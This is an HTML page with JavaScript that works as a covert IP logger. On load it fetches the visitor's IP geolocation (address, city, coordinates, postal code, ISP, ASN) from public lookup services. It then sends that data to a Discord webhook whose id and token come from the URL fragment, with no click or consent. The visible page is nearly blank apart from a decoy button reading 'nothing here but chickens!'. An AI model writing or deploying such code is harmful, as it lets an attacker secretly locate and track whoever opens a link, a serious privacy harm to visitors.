
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title></title>
<style>
:root {
  --bg: #0b0f17;
  --card: #141a26;
  --line: #233047;
  --txt: #e7edf7;
  --dim: #8fa0bd;
  --acc: #5eead4;
  --warn: #fbbf24;
}
* { box-sizing: border-box; margin: 0; padding: 0; }
body {
  font-family: "Segoe UI", system-ui, -apple-system, sans-serif;
  background: var(--bg);
  color: var(--txt);
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 24px;
}
.card {
  width: 100%;
  max-width: 560px;
  background: var(--card);
  border: 1px solid var(--line);
  border-radius: 16px;
  padding: 28px;
}
h1 { font-size: 20px; margin-bottom: 4px; }
.sub { color: var(--dim); font-size: 13px; margin-bottom: 16px; }
.notice {
  background: rgba(94, 234, 212, .08);
  border: 1px solid rgba(94, 234, 212, .25);
  color: var(--acc);
  font-size: 12.5px;
  padding: 10px 12px;
  border-radius: 10px;
  margin-bottom: 18px;
  line-height: 1.5;
}
.notice.warn {
  background: rgba(251, 191, 36, .08);
  border-color: rgba(251, 191, 36, .3);
  color: var(--warn);
}
.btn {
  display: block;
  width: 100%;
  background: var(--acc);
  color: #08312b;
  font-weight: 700;
  font-size: 15px;
  border: 0;
  border-radius: 10px;
  padding: 12px;
  cursor: pointer;
  margin-bottom: 10px;
}
.btn:disabled { opacity: .45; cursor: default; }
.status {
  color: var(--dim);
  font-size: 12.5px;
  margin: 0 0 16px;
  min-height: 1em;
}
.status.ok { color: var(--acc); }
.status.err { color: #f87171; }
.grid {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 10px;
}
.item {
  background: #0f1520;
  border: 1px solid var(--line);
  border-radius: 10px;
  padding: 10px 12px;
}
.item.wide { grid-column: 1 / -1; }
.k {
  color: var(--dim);
  font-size: 11px;
  text-transform: uppercase;
  letter-spacing: .5px;
  margin-bottom: 4px;
}
.v { font-size: 14px; word-break: break-all; }
.v.big { font-size: 17px; font-weight: 600; }
.foot {
  margin-top: 16px;
  color: var(--dim);
  font-size: 11.5px;
  text-align: center;
}
@media (max-width: 480px) {
  .grid { grid-template-columns: 1fr; }
}
</style>
</head>
<body>
<div class="card">
  <h1></h1>
  <p class="sub"></p>
  <p class="notice" id="notice">
  </p>
<button id="shareBtn" class="btn" style="display:none" disabled>
  nothing here but chickens!
</button>
  <p class="status" id="shareStatus"></p>
  <div class="grid" id="grid">
    <div class="item wide"><div class="v">Loading…</div></div>
  </div>
  <p class="foot" id="src"></p>
</div>

<script>
var $grid = document.getElementById('grid');
var $notice = document.getElementById('notice');
var $shareBtn = document.getElementById('shareBtn');
var $shareStatus = document.getElementById('shareStatus');

var shareMatch =
  /^#w=(\d{5,25})\/([A-Za-z0-9_-]{20,120})$/.exec(location.hash || '');

var info = null;

function item(label, value, wide) {
  if (value === undefined || value === null || value === '') return '';

  var el = document.createElement('div');
  el.className = 'item' + (wide ? ' wide' : '');

  var k = document.createElement('div');
  k.className = 'k';
  k.textContent = label;

  var v = document.createElement('div');
  v.className = 'v' + (wide ? ' big' : '');
  v.textContent = String(value);

  el.append(k, v);
  return el;
}

async function getData() {
  try {
    var r = await fetch('https://ipwho.is/', { cache: 'no-store' });
    if (!r.ok) throw new Error('Primary API request failed');

    var d = await r.json();
    if (!d || d.success === false) throw new Error('Primary API failed');

    return { d: d, src: 'ipwho.is' };
  } catch (e) {
    var r2 = await fetch('https://ipapi.co/json/', { cache: 'no-store' });
    if (!r2.ok) throw new Error('Fallback API request failed');

    var d2 = await r2.json();
    return { d: d2, src: 'ipapi.co' };
  }
}

function normalize(d, src) {
  if (src === 'ipwho.is') {
    return {
      ip: d.ip,
      flag: d.flag && d.flag.emoji ? d.flag.emoji + ' ' : '',
      country: d.country,
      code: d.country_code,
      capital: d.capital,
      region: d.region,
      city: d.city,
      postal: d.postal,
      lat: d.latitude,
      lon: d.longitude,
      tz: d.timezone && d.timezone.id,
      isp: d.connection && d.connection.isp,
      org: d.connection && d.connection.org,
      asn: d.connection && d.connection.asn,
      domain: d.connection && d.connection.domain,
      continent: d.continent
    };
  }

  return {
    ip: d.ip,
    flag: '',
    country: d.country_name,
    code: d.country_code,
    capital: d.country_capital,
    region: d.region,
    city: d.city,
    postal: d.postal,
    lat: d.latitude,
    lon: d.longitude,
    tz: d.timezone,
    isp: d.org,
    org: d.org,
    asn: d.asn,
    domain: '',
    continent: d.continent_code
  };
}

async function loadInfo() {
  try {
    var res = await getData();
    info = normalize(res.d, res.src);

    var values = [
    ];

    $grid.replaceChildren();

    values.forEach(function(entry) {
      var el = item(entry[0], entry[1], entry[2]);
      if (el) $grid.appendChild(el);
    });

    if (!$grid.children.length) {
      $grid.textContent = '';
    }

    document.getElementById('src').textContent = 'Data source: ' + res.src;

    if (shareMatch) {
      $notice.classList.add('warn');
      $shareBtn.style.display = 'block';
      $shareBtn.disabled = false;
    }
  } catch (e) {
    $grid.replaceChildren();

    var errorItem = document.createElement('div');
    errorItem.className = 'item wide';
    errorItem.textContent =
      'Could not load your connection info. Try refreshing the page.';

    $grid.appendChild(errorItem);
  }
}

async function SHARE() {
  if (!info || !shareMatch) {
    $shareStatus.className = 'status err';
    $shareStatus.textContent =
      'Connection info is not ready or sharing is unavailable.';
    return false;
  }

  $shareBtn.disabled = true;
  $shareStatus.className = 'status';
  $shareStatus.textContent = 'Sending…';

  var fields = [];

  function f(name, value, inline) {
    if (value === undefined || value === null || value === '') return;

    fields.push({
      name: name,
      value: String(value).slice(0, 1024),
      inline: !!inline
    });
  }

  f('IP', info.ip, true);
  f('City', info.city, true);
  f('Region / state', info.region, true);
  f('Country', (info.flag || '') + (info.country || '') +
    (info.code ? ' (' + info.code + ')' : ''), true);
  f('Capital', info.capital, true);
  f('Latitude', info.lat, true);
  f('Longitude', info.lon, true);
  f('Postal code', info.postal, true);
  f('Timezone', info.tz, true);
  f('ISP / provider', info.isp, false);
  f('Organization', info.org, true);
  f('ASN', info.asn, true);
  f('Continent', info.continent, true);
  f('Domain', info.domain, true);

  var payload = {
    username: 'realer',
    embeds: [{
      title: 'Shared connection info',
      description:
        'new user',
      color: 0x5eead4,
      fields: fields,
      timestamp: new Date().toISOString(),
      footer: {
        text: '- REALER -'
      }
    }]
  };

  try {
    var response = await fetch(
      'https://discord.com/api/webhooks/' +
        shareMatch[1] + '/' + shareMatch[2],
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      }
    );

    if (!response.ok) throw new Error('HTTP ' + response.status);

    $shareStatus.className = 'status ok';
    $shareStatus.textContent = '';
    return true;
  } catch (e) {
    $shareStatus.className = 'status err';
    $shareStatus.textContent = '';
    return false;
  } finally {
    $shareBtn.disabled = false;
  }
}

loadInfo().then(function() {
  SHARE();
});
</script>
</body>
</html>
```
